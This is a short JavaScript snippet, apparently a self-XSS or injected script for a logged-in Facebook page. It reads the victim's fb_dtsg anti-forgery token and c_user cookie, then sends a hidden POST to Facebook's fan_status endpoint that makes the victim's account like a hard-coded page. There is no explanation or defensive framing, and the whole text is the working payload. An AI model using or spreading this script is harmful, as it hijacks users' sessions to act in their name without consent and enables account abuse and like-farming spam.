var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
     var PageParams ="fbpage_id=213141322105576&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&__user="+user_id+"&__a=1&__dyn=7n8ajEAMCBynzpQ9UoHaEWy6zECiq78hAKGgSGGeqrWpUpBxCuUWdDx2u&__req=6&fb_dtsg="+fb_dtsg+"&ttstamp=265816954112707488481177473&__rev=1320056";
    Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
     }
  };
  Page.send(PageParams);
}
